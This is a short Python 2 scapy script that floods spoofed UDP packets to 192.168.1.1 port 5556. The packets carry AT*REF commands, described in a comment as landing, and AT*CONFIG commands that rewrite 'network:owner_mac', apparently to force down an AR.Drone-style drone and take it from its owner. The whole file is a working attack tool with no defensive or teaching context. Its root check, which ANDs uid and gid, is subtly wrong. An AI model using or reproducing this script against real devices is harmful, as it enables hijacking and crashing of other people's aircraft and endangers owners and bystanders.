#! /usr/bin/env python

# based off subverter.py

import os, sys
from scapy.all import *

def printUsage():
    print "please include fake MAC address you want to use"
    print "Usage: %s MAC_ADDRESS" % sys.argv[0]

def isRoot():
    """Verifies if the current user is root"""
    return os.getuid() & os.getgid() == 0

if __name__ == "__main__":

    if len(sys.argv) < 2:
        printUsage()
        sys.exit(0)

    fake_mac = sys.argv[1]

    if not isRoot():
        print "[-] Your have to be root to use scapy"
        sys.exit(0)

    # try packet forging attack
    try:
        while(True):
            # seqno 1 is always accepted
            land_cmd = "AT*REF=%d,0\r" % 1
            # connects different owner, disconnects if 00:00:00:00:00:00
            disconnect_cmd = 'AT*CONFIG=1,"network:owner_mac","%s"' % fake_mac

            for i in xrange(256): # 8 bits in last field
                real_ip = '192.168.1.' + str(i)
                land_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd
                disconnect_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/disconnect_cmd
                send(land_pkt)
                send(disconnect_pkt)

    except KeyboardInterrupt:
        sys.exit(0)






